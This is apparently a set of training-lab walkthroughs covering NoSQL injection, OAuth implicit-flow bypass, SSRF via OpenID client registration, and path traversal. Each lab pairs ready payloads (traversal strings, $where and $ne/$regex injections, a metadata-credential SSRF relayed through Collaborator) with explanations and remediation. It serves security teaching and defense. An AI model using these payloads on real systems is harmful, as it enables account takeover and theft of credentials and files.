Goal: the user-lookup functionality is powered by MongoDB and vulnerable to NoSQL injection through the $where operator. Extract the administrator account's password and log in as them. Own credentials for testing: wiener:peter.

BASICS — blind extraction via $where

$where lets a MongoDB query embed an arbitrary JavaScript boolean expression that is evaluated once per document: {"$where": "<expr>"}. If user input reaches that expression unsanitised, an attacker can append their own condition — one that references a field they cannot otherwise read (like this.password) — and observe whether the overall query still matches. A true/false difference in the response becomes an oracle: ask one character at a time, and the hidden value can be reconstructed completely without ever seeing it directly. This is the exact same idea as blind boolean-based SQL injection, just phrased in JavaScript.

docs.title: 1. Confirm the injection point
docs.text:
The user-lookup endpoint accepts a username and (internally) builds something equivalent to:

{ "$where": "this.username == 'wiener'" }

Append a tautology to confirm the application evaluates attacker-supplied JavaScript as part of this condition:

username=wiener' && '1'=='1

If the response for the true case differs from an always-false case (wiener' && '1'=='2), the endpoint is confirmed vulnerable to $where injection.

docs.title: 2. Extract the administrator's password one character at a time
docs.text:
Target the administrator account and test each character position against the alphabet. The trailing || 'a'=='b' keeps the JavaScript syntactically closed without ever matching on its own, so only the injected condition decides the outcome:

administrator' && this.password[0] == 'a' || 'a'=='b

{ "$where": "this.username == 'administrator' && this.password[0] == 'a' || 'a'=='b'" }
  • If the response indicates a match (e.g. the user is "found" / a success page is returned), the first character of the password is a.
  • If not, repeat with b, c, d, … until a match is found.
  • Move to this.password[1], then [2], and so on, repeating the full alphabet sweep for each position.
  • Stop extending once a candidate length no longer matches any character (end of the password) — or confirm length first using this.password.length == N the same way.

This process is mechanical and ideal for Burp Intruder: position the payload at the character being tested, use a wordlist of printable characters as the payload set, and use Grep - Match on a string that only appears in the "true" response to automatically flag hits.

A regex can also narrow faster than single characters, e.g. confirming the password contains a digit before brute-forcing exact positions:

administrator' && this.password.match(/\d/) || 'a'=='b

docs.title: 3. Reassemble the password and log in
docs.text:
Once every character position has been determined, concatenate them into the full password and submit it against the normal login form for the administrator account.

POST /login HTTP/2
Content-Type: application/json

{"username":"administrator","password":"<recovered-password>"}

A successful login as administrator solves the lab.

docs.title: Why it works
docs.text: $where evaluates arbitrary JavaScript against each candidate document, including fields the attacker has no direct read access to. Because the condition's truth value leaks through an observable side effect (a different HTTP response), the attacker can turn "I can't read this.password" into "I can ask yes/no questions about this.password as many times as I like" — and a long enough series of yes/no questions reconstructs the entire value.

docs.title: Remediation
docs.text:
• Disable $where and other server-side JavaScript evaluation features unless there is no alternative; nearly every legitimate use case can be expressed with standard query operators instead.
  • Never interpolate user input into a $where expression string — if JavaScript evaluation is unavoidable, pass data as bound parameters, not as part of the expression text.
  • Rate-limit and monitor for the high request volume this character-by-character technique requires, which is a strong detection signal even when the root cause isn't yet fixed.

docs.title: Lab: Exploiting NoSQL operator injection to bypass authentication
docs.text: Goal: the login form sends JSON to a MongoDB-backed /login endpoint. Abuse query operators instead of plain string values to log in without knowing a password, ultimately reaching an admin account.

docs.title: 1. Capture a normal login request
docs.text:
Log in with the lab's own test credentials (wiener:peter) and send the request to Burp Repeater. The backend query maps straight from the JSON body:

POST /login HTTP/2
Content-Type: application/json

{"username":"wiener","password":"peter"}

HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=9CVNaY1A9n65Cn0Ay5FLygppaIA60hLN; ...

docs.title: 2. Replace scalar fields with operator objects
docs.text:
Instead of plain strings, send MongoDB operators in place of the username/password values. $regex lets you match any username that starts with "admin", and $ne makes the password check true for anything other than an empty string:

{
  "username": { "$regex": "admin" },
  "password": { "$ne": "" }
}

POST /login HTTP/2
Content-Type: application/json

{"username":{"$regex":"admin"},"password":{"$ne":""}}

The server resolves this into a MongoDB query equivalent to "find a user whose username contains admin, with any non-empty password" — and logs the attacker in as that account without ever supplying its real credentials.

HTTP/2 302 Found
Location: /my-account?id=adminsmxx8ymi
Set-Cookie: session=BgndhjpKo2p3QJDxOO3J0TBt3FN2p5oJ; ...

docs.title: 3. Confirm the bypass
docs.text: Follow the redirect to My account and confirm the session now belongs to the randomised admin username the application generated for this lab instance.

docs.title: Why it works
docs.text: The login handler trusts the client-sent JSON's structure and passes username/password straight into db.users.find({...}) without checking that each value is a plain string. MongoDB doesn't distinguish "a value the developer intended as literal data" from "an operator object" — both are just JSON. By supplying {"$regex": "admin"} and {"$ne": ""}, the attacker turns two equality checks into "username matches a pattern" and "password is non-empty", a condition almost any real admin account satisfies.

docs.title: Remediation
docs.text:
• Reject request bodies where an expected string field is actually an object/array before it reaches the query — enforce types at the API boundary.
  • Use the database driver's typed query-builder rather than passing parsed client JSON straight into a filter.
  • Apply strict JSON schema validation to authentication endpoints specifically, since they are the highest-value target for this bypass.

docs.title: The basics: what OAuth actually is
docs.text: OAuth 2.0 is an authorization framework: it lets a user grant a third-party application limited access to their data on some other service, without handing over their password to that third party. "Login with Google/Facebook/GitHub" is the use case everyone recognizes, but under the hood OAuth was designed for things like "let this photo-printing app see my Google Photos" — access delegation, not identity.

docs.title: The parties involved
docs.text: Role Who it is Client application The site/app that wants access to the user's data (e.g., a new app wanting your contacts) Resource owner The user whose data is being accessed OAuth service provider Owns the user's data; runs both the authorization server (login/consent) and the resource server (the API that actually serves the data)

docs.title: The basic flow
docs.text:
1. Request access — the client asks the provider for specific permissions (scope).
  2. User consent — the user logs into the provider and approves (or denies) those permissions.
  3. Token issuance — the client receives an access token.
  4. API access — the client uses that token to call the resource server on the user's behalf.

docs.title: Grant types (flows)
docs.text:
The client picks a grant type via response_type, and the request also needs client_id, redirect_uri, scope, and a state value (CSRF protection for the flow itself).

Authorization code grant (recommended) — response_type=code. The authorization server redirects the browser back to redirect_uri with a short-lived code. The client's server then exchanges that code for an access token in a back-channel POST to the token endpoint, authenticating itself with client_secret. The token is never exposed to the browser at any point.

POST /token HTTP/1.1
Host: oauth-provider.com

client_id=...&client_secret=...&code=...&redirect_uri=...&grant_type=authorization_code

Implicit grant (legacy, discouraged) — response_type=token. No code exchange step: the access token comes back directly in the redirect, in the URL fragment:

https://client-app.com/callback#access_token=eyJhbGci...&token_type=Bearer

Client-side JavaScript reads the token straight out of location.hash. There's no client_secret, no server-side exchange, and the token is exposed to browser history, the Referer header, and any XSS on the page — which is why it's largely been superseded by Authorization Code + PKCE.

Authorization code Implicit Token exposure Server only Browser Client authentication Yes (client_secret) No Refresh token Yes Usually no Recommended today Yes No

docs.title: OAuth used for authentication (not just authorization)
docs.text:
OAuth was never designed to answer "who is this user," only "what can this client access." But it's become the de facto standard for social login anyway, functioning similarly to SAML SSO:

  1. User clicks "Login with social media."
  2. The client redirects through the normal OAuth authorization flow, requesting an identity scope (openid, profile, email).
  3. The client receives an access token.
  4. The client calls the provider's /userinfo endpoint with that token.
  5. The client treats whatever identity field comes back (email, user ID, username) as proof of who the user is, and creates a local session accordingly.

This repurposing is where most OAuth vulnerabilities live: the access token is being used as a stand-in for "a password check succeeded," but nothing in the OAuth spec guarantees the properties an authentication system actually needs (non-replayability tied to a specific client, strong binding between the token and the identity claim, etc.) unless the client implementation adds them itself.

docs.title: Why OAuth implementations end up vulnerable
docs.text:
• Many moving parts — client app, authorization server, resource server, browser redirects; a flaw in any one link breaks the whole chain.
  • Complex, rarely-reimplemented-correctly logic — most teams integrate OAuth once and never revisit the fine print.
  • Third-party trust — the client's security now partially depends on a service it doesn't control.
  • Common, predictable misconfigurations — because so many implementations copy the same patterns, so do their mistakes.

docs.title: Key attack areas
docs.text:
• Flawed client validation of the implicit flow — trusting data returned to the client without properly validating it came from a legitimate, completed flow for this client and this user.
  • Redirect URI validation flaws — if the provider doesn't strictly validate redirect_uri, an attacker can redirect tokens/codes to a server they control.
  • CSRF on the OAuth callback — missing or unchecked state lets an attacker bind their own OAuth grant to a victim's session (login CSRF), or steal a victim's authorization code.
  • Scope manipulation — requesting or retaining broader access than the user actually consented to.
  • SSRF via dynamic client registration — when the authorization server lets clients self-register, data about the new "client" (like a logo URI) may be fetched server-side without adequate restriction.

docs.title: Prevention
docs.text:
• Never use the implicit flow to make a security decision; validate identity server-side, with a token or code obtained through a back-channel exchange whenever possible.
  • Always validate redirect_uri with an exact allow-list — not a prefix or substring match.
  • Always generate, send, and strictly verify a unique state parameter per authorization request.
  • When acting as an OAuth client for authentication, additionally verify an ID token's signature, issuer, audience, and expiry (OpenID Connect) rather than trusting a bare access-token-derived profile lookup.
  • If supporting dynamic client registration, treat every attacker-suppliable URL in that registration data (logo, client URI, JWKS URI) as a potential SSRF vector and restrict what the server will fetch.

docs.title: Labs in this section
docs.text:
• Lab: Authentication bypass via OAuth implicit flow
  • Lab: SSRF via OpenID dynamic client registration

docs.title: Lab: Authentication bypass via OAuth implicit flow
docs.text:
This lab's client application uses the OAuth implicit grant for social login: the authorization server redirects back with an access_token in the URL fragment, client-side JavaScript picks it up, calls the provider's /userinfo-equivalent endpoint, and then POSTs the result — including an email field — to the client application's own /authenticate endpoint to finish logging the user in.

The flaw: /authenticate trusts whatever email value the browser sends it, without independently verifying that the accompanying access_token actually belongs to a user with that email. Since the token and the email are sent as two separate, independently-editable fields, an attacker can keep their own valid token (proving nothing more than "a real login happened") while swapping in the victim's email — and the server logs them in as the victim.

To solve the lab, log in as Carlos (carlos@carlos-montoya.net), using your own account wiener:peter to drive a legitimate OAuth flow.

docs.title: 1. Walk through a normal login to see the flow
docs.text:
Click "Login with social media" and let it redirect to the OAuth provider:

Sign in with your own credentials (wiener:peter) at the provider's sign-in form:

After signing in, the provider redirects back to the client application with an access_token in the URL fragment. The client's JavaScript reads that fragment, calls the provider to resolve it to profile data (including your email), and then sends a POST like this to finish the login:

POST /authenticate HTTP/2
Host: client-app.com
Content-Type: application/json

{"email":"wiener@hotdog.com"}

(Depending on the exact lab build, the token itself may also be included in this request or only used to make the preceding profile lookup — either way, /authenticate is the step that actually establishes the session, and it keys off email alone.)

docs.title: 2. Capture the authenticate request and isolate the trust boundary
docs.text: Intercept the /authenticate request in Burp. The important observation: this request is sent after the token has already been exchanged for profile data client-side. The server-side /authenticate handler has no way to see the original token exchange — it only sees whatever JSON the browser decided to send it, and it trusts the email field at face value.

docs.title: 3. Replay the request with the victim's email
docs.text:
Send the captured /authenticate request to Repeater, and change only the email value to Carlos's:

POST /authenticate HTTP/2
Host: client-app.com
Content-Type: application/json

{"email":"carlos@carlos-montoya.net"}

Because the handler never cross-checks this value against the actual OAuth token or profile lookup result, it accepts the request and issues a session for Carlos's account.

docs.title: 4. Load the application as Carlos
docs.text: Follow the response (or just browse to the application) with the newly-issued session cookie. The application now treats you as Carlos, and the lab is marked solved.

docs.title: Why it works
docs.text: The client application correctly performs an OAuth flow to obtain an access token and uses it to fetch the authenticated user's profile — but then hands the result of that lookup (the email address) to the browser, and trusts the browser to faithfully send that same value back unmodified in a later, separate request. Because the email and the proof-of-authentication (the token) are decoupled into two independently controllable pieces of client-supplied data, nothing stops an attacker from supplying a validly-obtained token for their own account alongside an arbitrary email of their choosing. The server-side session is created from data it never independently verified.

docs.title: Remediation
docs.text:
• Never let the client (browser) tell the server which identity a token resolved to. The server should look up the identity itself, directly from the token, in a single trusted call it controls.
  • Prefer the authorization code flow (or Authorization Code + PKCE) for anything used to authenticate users, so the token exchange and identity resolution both happen server-side, out of the browser's reach.
  • If OpenID Connect is available, validate the ID token's signature, issuer, audience and expiry server-side rather than trusting a separately-reported profile field.

docs.title: Lab: SSRF via OpenID dynamic client registration
docs.text:
OpenID Connect defines an optional dynamic client registration mechanism: instead of an administrator manually registering every OAuth client with the authorization server ahead of time, a client application can register itself on the fly by POSTing its metadata to a registration_endpoint. That metadata can include URLs the authorization server is expected to use later — a logo_uri the server fetches to display the client's branding being the classic one.

If the authorization server fetches any of that attacker-suppliable metadata server-side without restriction, self-registration turns into SSRF: the attacker supplies a URL pointing at an internal service (or, as in this lab, the cloud provider's instance metadata endpoint) as the "logo," and the server dutifully fetches it on the attacker's behalf.

To solve the lab, reach http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the exposed cloud credentials, exfiltrating the response via Burp Collaborator (the lab firewall blocks direct interaction with arbitrary external systems, so Collaborator's public server is the only outbound channel available).

docs.title: 1. Trigger the OAuth flow to find the provider
docs.text:
Starting from the client application, follow the social-login flow far enough to see where it redirects:

Sign in with your own lab credentials (wiener:peter) at the provider:

Confirm the flow completes normally and you're logged into the client application as wiener:

docs.title: 2. Discover the registration endpoint via the OpenID configuration document
docs.text:
Every compliant OpenID provider publishes its configuration at a well-known path. Request it directly:

GET /.well-known/openid-configuration HTTP/2
Host: oauth-SERVER-ID.oauth-server.net

The response advertises every endpoint the provider exposes, including the one of interest here:

"registration_endpoint": "https://oauth-SERVER-ID.oauth-server.net/reg",
"response_modes_supported": ["form_post", "fragment", "query"]

docs.title: 3. Register a malicious client with an SSRF payload as its logo
docs.text:
POST a client-metadata document to the discovered registration_endpoint, setting logo_uri to the internal URL you want the server to fetch. Point it at a Burp Collaborator URL first, purely to prove the server-side fetch is real and blind (no response is reflected back to you):

POST /reg HTTP/2
Host: oauth-SERVER-ID.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net"],
  "client_name": "exploit",
  "logo_uri": "http://YOUR-SUBDOMAIN.oastify.com"
}

A successful registration returns a client_id and echoes the metadata back, and shortly afterward a DNS/HTTP interaction arrives at Collaborator — confirming the authorization server fetches logo_uri server-side, with no validation that it points anywhere sane.

docs.title: 4. Repoint logo_uri at the cloud metadata endpoint, piping the response through Collaborator
docs.text:
Since the lab firewall blocks direct access to arbitrary external hosts, the exfiltration channel has to go through Collaborator's permitted public server. Register a new client (or update the existing one, if the provider allows it) with logo_uri set to a URL that causes the metadata response to be relayed onward — for example, a redirector that forwards the fetched metadata content to your Collaborator server, or, if the client-detail admin page later renders the registered logo, viewing that rendered page to retrieve the fetched body directly:

{
  "redirect_uris": ["https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net"],
  "client_name": "exploit2",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

The authorization server's server-side fetch of logo_uri reaches the cloud metadata service — which is only reachable from inside the provider's own network — and retrieves the named IAM role's temporary credentials.

docs.title: 5. Retrieve the stolen credentials
docs.text: Whatever the lab's logo-rendering surface is (a client details/admin page that displays the registered logo, or a follow-up fetch chained through the SSRF), the response body containing the AWS access key, secret key, and session token for the admin role is what solves the lab once retrieved.

docs.title: Why it works
docs.text: Dynamic client registration lets an untrusted, self-registering client supply arbitrary metadata — including URLs — that the authorization server later fetches or renders server-side, trusting that the data describes a legitimate third-party application. Nothing in the registration protocol itself requires the server to validate that logo_uri (or any other URL field) points somewhere safe to fetch from. Combined with the authorization server's own privileged network position (it can usually reach cloud instance metadata, internal admin panels, etc.), this turns a "branding" field into a full SSRF primitive with server-side credentials behind it.

docs.title: Remediation
docs.text:
• Treat every URL field an OAuth client supplies during (self-)registration as untrusted input, and validate it against an allow-list of permitted schemes/hosts before ever fetching it server-side.
  • Don't fetch client-supplied URLs from the same network context that has access to cloud metadata services or other internal infrastructure — isolate any such fetch into a sandboxed, network-restricted egress path.
  • Disable dynamic client registration entirely unless it's actually required, and if required, require manual approval before a self-registered client's metadata is ever fetched or rendered.
  • Block outbound requests to the cloud metadata address range (169.254.169.254 and equivalents) from any service that doesn't explicitly need it, and prefer IMDSv2-style metadata access that resists blind SSRF.

docs.title: Path Traversal
docs.text: Path traversal (also called directory traversal) occurs when an application takes user-controlled input and uses it, with insufficient sanitization, to build a path to a file on disk. If the input can contain ../ sequences (or an absolute path), the attacker can make the application read — or in some cases write — files outside the directory it was intended to restrict access to.

docs.title: The vulnerable pattern
docs.text:
A very common feature is "fetch this named resource from a fixed directory", for example a product image:

GET /image?filename=218.png

path = BASE_DIR + "/" + request.get("filename")
return send_file(path)

BASE_DIR is meant to be a hard boundary — the feature is only supposed to serve files from inside it. But string concatenation does not enforce that boundary; the filesystem happily resolves .. (parent directory) sequences, so if filename is not restricted to safe characters, an attacker can walk back out of BASE_DIR and into any directory the web server process can read:

GET /image?filename=../../../etc/passwd

BASE_DIR + "/../../../etc/passwd"  →  /etc/passwd

/etc/passwd is the standard harmless-but-conclusive proof file on Linux targets — readable by any user, and its presence/format in the response unambiguously proves arbitrary file read.

docs.title: Impact
docs.text:
• Disclosure of configuration files, source code, credentials, and private keys
  • Reading other users' data outside the intended directory
  • In combination with a file upload or log-injection primitive, path traversal in a write path can escalate to remote code execution (see path traversal used to defeat upload restrictions)

docs.title: Common defenses, and how they get bypassed
docs.text:
Developers rarely ship a traversal endpoint with zero mitigation — the interesting part is which specific mitigation is in place, and what it misses. The six labs in this section each isolate one bypass:

Defense attempted Bypass Payload shape None / naive concatenation Just traverse ../../../etc/passwd Strip ../ once Nest the sequence so stripping it once still leaves a working one ....//....//....//etc/passwd Strip ../ once, then URL-decode Double-encode so decoding happens after the strip ..%252f..%252f..%252fetc/passwd Require path to start with the base directory Start with it, then traverse back out — many path checks look at the string without resolving it /var/www/images/../../../etc/passwd Require path to start with the base directory, but still resolve /etc/passwd as "valid" Supply the absolute path directly — if the base-dir check is dropped/misapplied, the literal target works /etc/passwd Require a specific trailing file extension Null-byte-terminate before the extension so the OS call truncates the string there ../../../etc/passwd%00.png

docs.title: Why each one works
docs.text:
• Non-recursive stripping: ....// → stripping the literal substring ../ from ....// (reading it as .. + ./ + /) can still leave ../ behind if the filter only removes the pattern once instead of looping until no more matches exist. Different filters tokenize this differently, but the principle is the same: a single-pass removal is not the same as rejecting all traversal.
  • Superfluous URL-decoding: if the application decodes the URL once for the traversal filter but the underlying framework/server decodes it again before using it as a filesystem path, double-encoding (%25 = encoded %, so %252f decodes first to %2f, then to /) smuggles the real sequence through the filter's single decode pass.
  • Start-of-path validation bypass: some filters only check that the resulting string begins with the expected base directory, without resolving . and .. segments first. /var/www/images/../../../etc/passwd begins with /var/www/images as a string, satisfying that check, but the filesystem resolves it straight to /etc/passwd.
  • Absolute path: closely related — if the "must start with base directory" check is bypassed entirely or absent for this case, supplying /etc/passwd directly works because most file-open APIs treat a leading / as the filesystem root, overriding whatever base directory the application intended to prepend.
  • Null byte before the required extension: when the application demands a safe-looking extension (e.g. .png) but the underlying file-read call is implemented in or calls into a language/runtime that treats an embedded null byte as a string terminator, %00 after the traversal sequence ends the path there, discarding the extension requirement that comes after it.

docs.title: Testing workflow
docs.text:
1. Identify a parameter that is used to read or reference a file by name (filename, file, path, template, image, document, …).
  2. Send the baseline request and note the normal response.
  3. Try a direct traversal payload (../../../etc/passwd) first — confirms there is no protection at all.
  4. If blocked, try each bypass pattern above in turn via Burp Repeater, watching for the contents of /etc/passwd (or another known-readable file) in the response.
  5. Note which defense was in place from how the bypass behaved — that tells you exactly what the developer attempted and missed.

docs.title: Remediation
docs.text:
• Avoid building file paths from user input entirely where possible — use an indirect reference (an ID that maps to a filename in a lookup table) instead of taking a filename/path directly from the request.
  • If a filename must be accepted, strip it to a basename only (drop any directory component) and validate it against a strict allowlist of characters before use.
  • Canonicalize the final path (resolve all ./../symlinks to an absolute path) and verify that the resolved path is still inside the intended base directory, before opening the file — never rely on string prefix/substring checks against the unresolved input.
  • Apply filesystem permissions so the application process cannot read files it has no legitimate reason to access, as defense in depth.
  • Decode user input exactly once, in exactly one place, before any traversal-sequence validation — inconsistent or repeated decoding between the filter and the code that actually uses the path is what most of these bypasses exploit.

docs.text: Lab Bypass File path traversal, simple case No defense at all Path traversal, traversal sequences blocked with absolute path bypass Base-directory check dropped for absolute paths File path traversal, traversal sequences stripped non-recursively Single-pass ../ stripping File path traversal, traversal sequences stripped with superfluous URL-decode Double URL-encoding File path traversal, validation of start of path String-prefix check instead of path resolution File path traversal, validation of file extension with null byte bypass %00 before the required extension

docs.title: Path traversal, traversal sequences blocked with absolute path bypass
docs.text:
Lab: PortSwigger Web Security Academy — Path traversal, traversal sequences blocked with absolute path bypass (Apprentice).

Here the application blocks filename values containing traversal sequences like ../, which stops the simple-case payload. The filter, however, only rejects relative traversal — it never verifies that the resulting path stays inside the intended base directory when an absolute path is supplied instead.

docs.title: Steps
docs.text:
1. Use Burp Suite to intercept and modify a request that fetches a product image.

  2. Modify the filename parameter, giving it the value:

    /etc/passwd

  3. Forward the request. Because there is no ../ sequence to catch, the filter lets it through — and the underlying file-open call treats the leading / as the filesystem root, ignoring whatever base directory the application meant to prepend. The response contains the contents of /etc/passwd.

docs.title: Why it works
docs.text: Blocking traversal sequences (../) is not the same as enforcing that the final path is confined to a base directory. Most file-handling APIs resolve an absolute path (one starting with /) as-is, discarding any base directory the calling code intended to prepend. The filter checked the input string for a specific pattern instead of checking where the final, resolved path actually points.

docs.title: Remediation
docs.text: See the Path Traversal overview. Specifically: after building the candidate path, resolve it to a canonical absolute path and explicitly verify it is still a descendant of the intended base directory — don't rely on blacklisting ../, which says nothing about absolute-path input.

docs.title: File path traversal, traversal sequences stripped non-recursively
docs.text:
Lab: PortSwigger Web Security Academy — File path traversal, traversal sequences stripped non-recursively (Apprentice).

The application removes ../ from the filename parameter — but only in a single pass. If the attacker nests one traversal sequence inside another, removing the inner occurrence can leave a complete, working ../ behind.

docs.title: Steps
docs.text:
1. Use Burp Suite to intercept and modify a request that fetches a product image.

  2. Modify the filename parameter, giving it the value:

    ....//....//....//etc/passwd

  3. Forward the request. The filter strips the literal ../ pattern it is looking for from each ....// segment; what remains after a single, non-looping strip reassembles into ../../../etc/passwd, and the response contains the contents of /etc/passwd.

docs.title: Why it works
docs.text: A correct sanitizer must strip traversal sequences recursively — continuing to remove and re-check until no sequence remains, since removing one occurrence can expose another. A single-pass strip is trivially bypassed by pre-nesting the dangerous sequence inside extra traversal characters designed to be consumed by that one pass, leaving the real payload intact underneath.

docs.title: Remediation
docs.text: See the Path Traversal overview. Specifically: avoid substring stripping entirely — canonicalize the path (which eliminates all ./.. segments in one well-defined operation, with no "passes" to exhaust) and verify the result is inside the base directory, rather than trying to blacklist increasingly creative encodings of the same sequence.

docs.title: File path traversal, traversal sequences stripped with superfluous URL-decode
docs.text:
Lab: PortSwigger Web Security Academy — File path traversal, traversal sequences stripped with superfluous URL-decode (Apprentice).

The application strips ../ sequences from the (once-decoded) filename parameter. The problem is that the value gets URL-decoded a second time somewhere later in the request-handling pipeline — after the traversal filter has already run its single check.

docs.title: Steps
docs.text:
1. Use Burp Suite to intercept and modify a request that fetches a product image.

  2. Modify the filename parameter, giving it the value:

    ..%252f..%252f..%252fetc/passwd

  3. Forward the request. %25 is the URL-encoded form of %, so the first decode pass (the one the traversal filter sees) turns %252f into %2f — which does not match the literal ../ pattern being stripped, so the filter does nothing. A second decode pass later in the pipeline then turns %2f into /, reconstructing ../../../etc/passwd after the filter has already finished checking. The response contains the contents of /etc/passwd.

docs.title: Why it works
docs.text: The traversal filter and the code that ultimately opens the file disagree about how many times the input should be URL-decoded. Encoding the payload one extra time hides it from the filter's single decode-and-check pass, letting the dangerous sequence only materialize after validation is already complete — a classic "decode after validate" ordering bug.

docs.title: Remediation
docs.text: See the Path Traversal overview. Specifically: decode user input exactly once, in exactly one place, and perform traversal validation after that single decode and immediately before the path is used — never let decoding happen again downstream of the security check.

docs.title: File path traversal, simple case
docs.text:
Lab: PortSwigger Web Security Academy — File path traversal, simple case (Apprentice).

This is the baseline case: the image-fetching endpoint applies no traversal sanitization whatsoever to the filename parameter.

docs.title: Steps
docs.text:
1. Use Burp Suite to intercept and modify a request that fetches a product image, e.g.:

    GET /image?filename=218.png HTTP/2

  2. Modify the filename parameter, giving it the value:

    ../../../etc/passwd

  3. Forward the request. The response contains the contents of /etc/passwd:

    root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

Three levels of ../ is more than enough to reach the filesystem root from any reasonably shallow web directory, since extra ../ segments past the root are simply absorbed (resolving /.. yields / again).

docs.title: Why it works
docs.text: filename is concatenated directly onto a base image directory with no validation at all. The ../ sequences are resolved by the filesystem exactly as they would be on a command line, walking back up the directory tree to the root and then down into /etc/passwd.

docs.title: Remediation
docs.text: See the Path Traversal overview — in short: never build a file path directly from user input; canonicalize and verify the resolved path stays inside the intended directory before opening the file.

docs.title: File path traversal, validation of file extension with null byte bypass
docs.text:
Lab: PortSwigger Web Security Academy — File path traversal, validation of file extension with null byte bypass (Practitioner).

The application requires the filename parameter to end in an approved image extension (e.g. .png), on top of whatever traversal filtering it applies. The validation layer checks the full string; the underlying file-open call, however, is backed by a runtime/library that treats an embedded null byte as a string terminator.

docs.title: Steps
docs.text:
1. Use Burp Suite to intercept and modify a request that fetches a product image.

  2. Modify the filename parameter, giving it the value:

    ../../../etc/passwd%00.png

  3. Forward the request. The extension check sees the full string ending in .png and passes it. The lower-level file-open call, however, truncates the string at the null byte (%00), so the path it actually opens is ../../../etc/passwd — the .png the validator required is never part of the real filesystem call. The response contains the contents of /etc/passwd.

docs.title: Why it works
docs.text: Two different layers of the application disagree about where the filename string ends: the validation code (operating on the full, high-level string) sees a safe-looking .png suffix, while the lower-level API that performs the actual file read (frequently backed by C string-handling semantics) stops reading the string at the first null byte. The attacker exploits that gap by putting the traversal payload before the null byte and a harmless, allowed-looking extension after it — the validator reads the whole thing; the file system call reads only the dangerous part.

docs.title: Remediation
docs.text: See the Path Traversal overview. Specifically: validate and open the file using the same, fully-decoded string, with no layer of the pipeline able to see characters another layer will silently drop; reject any filename containing a null byte outright, and keep runtime/library versions patched, since most modern language runtimes now reject or correctly handle embedded null bytes in path APIs.

docs.title: File path traversal, validation of start of path
docs.text:
